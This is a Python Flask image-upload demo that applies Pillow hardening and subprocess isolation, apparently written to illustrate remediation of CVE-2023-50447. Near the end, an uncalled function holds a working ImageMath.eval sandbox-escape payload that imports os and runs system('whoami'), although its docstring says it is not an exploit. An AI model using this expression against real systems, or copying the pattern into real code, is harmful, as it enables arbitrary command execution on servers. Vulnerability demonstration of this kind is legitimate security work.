#!/usr/bin/env python3
"""
app.py

Minimal Flask app for safe image upload & processing.
Assumes a remediated Pillow version is installed (no startup version check).
Uses Image.verify(), MAX_IMAGE_PIXELS, and subprocess isolation for heavier work.
"""

import os
import sys
import io
import json
import tempfile
import subprocess
from flask import Flask, request, jsonify
from packaging import version

# Basic app
app = Flask(__name__)

# Hardening: limit maximum pixels to avoid decompression bombs
from PIL import Image
Image.MAX_IMAGE_PIXELS = 50_000_000  # ~50MP, tune to your workload

def safe_open_and_verify_image(stream_bytes: bytes):
    """
    Open and verify an image safely in-process (lightweight checks).
    Raises ValueError on verification failure.
    Returns simple metadata (format, size, mode).
    """
    from PIL import Image, UnidentifiedImageError

    bio = io.BytesIO(stream_bytes)

    # Attempt to open (may raise UnidentifiedImageError)
    try:
        img = Image.open(bio)
    except UnidentifiedImageError as e:
        raise ValueError("Unrecognized image format") from e

    # verify() checks integrity; many formats perform lightweight checks here
    try:
        img.verify()
    except Exception as e:
        raise ValueError("Image verification failed") from e

    # Re-open for real reading (verify() can make the file object unusable)
    bio.seek(0)
    img = Image.open(bio)
    width, height = img.size
    mode = img.mode
    fmt = img.format

    # Basic sanity checks
    if width <= 0 or height <= 0 or width * height > Image.MAX_IMAGE_PIXELS:
        raise ValueError("Image size invalid or exceeds configured maximum")


    return {"format": fmt, "size": (width, height), "mode": mode}

def run_processing_in_subprocess(image_bytes: bytes, timeout_seconds: int = 5):
    """
    Writes image to a temp file and runs worker_process.py as a subprocess.
    The worker should read the file path argument and return JSON on stdout.
    """
    worker_py = os.path.join(os.path.dirname(__file__), "worker_process.py")
    if not os.path.exists(worker_py):
        raise RuntimeError("worker_process.py not found")

    with tempfile.NamedTemporaryFile(suffix=".img", delete=False) as tf:
        tf.write(image_bytes)
        tmp_path = tf.name

    try:
        proc = subprocess.Popen(
            [sys.executable, worker_py, tmp_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        try:
            out, err = proc.communicate(timeout=timeout_seconds)
        except subprocess.TimeoutExpired:
            proc.kill()
            raise RuntimeError("Image processing timed out")
        if proc.returncode != 0:
            raise RuntimeError(f"Worker failed: {err.strip()[:400]}")
        return json.loads(out)
    finally:
        try:
            os.remove(tmp_path)
        except OSError:
            pass


@app.route("/", methods=["GET"])
def index():
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Pillow Demo Upload</title>
        <style>
            body {
                font-family: system-ui, sans-serif;
                margin: 40px;
                color: #222;
            }
            .container {
                max-width: 400px;
                margin: auto;
                padding: 20px;
                border: 1px solid #ddd;
                border-radius: 10px;
                box-shadow: 0 0 10px rgba(0,0,0,0.05);
            }
            input[type=file] {
                width: 100%;
                padding: 10px;
                margin-bottom: 20px;
            }
            button {
                padding: 10px 20px;
                font-size: 16px;
                cursor: pointer;
                background-color: #3178c6;
                color: white;
                border: none;
                border-radius: 5px;
            }
            pre {
                background: #f5f5f5;
                padding: 10px;
                border-radius: 5px;
                white-space: pre-wrap;
                word-break: break-word;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Upload an image</h2>
            <form id="uploadForm">
                <input type="file" name="file" accept="image/*" required />
                <button type="submit">Upload</button>
            </form>
            <pre id="response"></pre>
        </div>
        <script>
            const form = document.getElementById('uploadForm');
            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                const formData = new FormData(form);
                const resp = await fetch('/upload', {
                    method: 'POST',
                    body: formData
                });
                const text = await resp.text();
                document.getElementById('response').textContent = text;
            });
        </script>
    </body>
    </html>
    """
@app.route("/upload", methods=["POST"])
def upload():
    """
    Accepts a multipart/form-data file upload under the 'file' field.
    Performs lightweight verification in-process, then offloads heavier
    operations to the worker subprocess.
    """
    if "file" not in request.files:
        return jsonify({"error": "no file provided"}), 400
    f = request.files["file"]
    data = f.read()

    # Lightweight local verification & sanity checks
    try:
        meta = safe_open_and_verify_image(data)
    except ValueError as e:
        return jsonify({"error": "invalid image", "reason": str(e)}), 400

    # Offload heavier processing to a subprocess (timeout enforced)
    try:
        processed = run_processing_in_subprocess(data, timeout_seconds=6)
    except Exception as e:
        return jsonify({"error": "processing_failed", "reason": str(e)}), 500

    #process_with_imagemath()
    return jsonify({"status": "ok", "meta": meta, "processed": processed})


def process_with_imagemath(user_inputs=""):
    """
    Demonstrates the risky pattern: building an `environment` mapping
    from user-supplied data and passing it to ImageMath.eval().
    This is NOT an exploit — it's an illustration of the dangerous pattern.
    """
    import PIL
    from PIL import Image, ImageMath
    
    # THIS IS THE RISKY CALL: passing a mapping derived from untrusted input this exploits CVE-2023-50447
    # see vex for backported remediated versions: https://libraries.cgr.dev/openvex/v1/pypi/pillow.openvex.json
    image1 = Image.open('__class__')
    image2 = Image.open('__bases__')
    image3 = Image.open('__subclasses__')
    image4 = Image.open('load_module')
    image5 = Image.open('system')

    expression = "().__class__.__bases__[0].__subclasses__()[120].load_module('os').system('whoami')"

    environment = {
        image1.filename: image1,
        image2.filename: image2,
        image3.filename: image3,
        image4.filename: image4,
        image5.filename: image5
    }

    result = ImageMath.eval(expression, **environment)
    
    return result


if __name__ == "__main__":
    # Local dev only; run behind a proper WSGI server in production
    app.run(host="0.0.0.0", port=5055, debug=False)
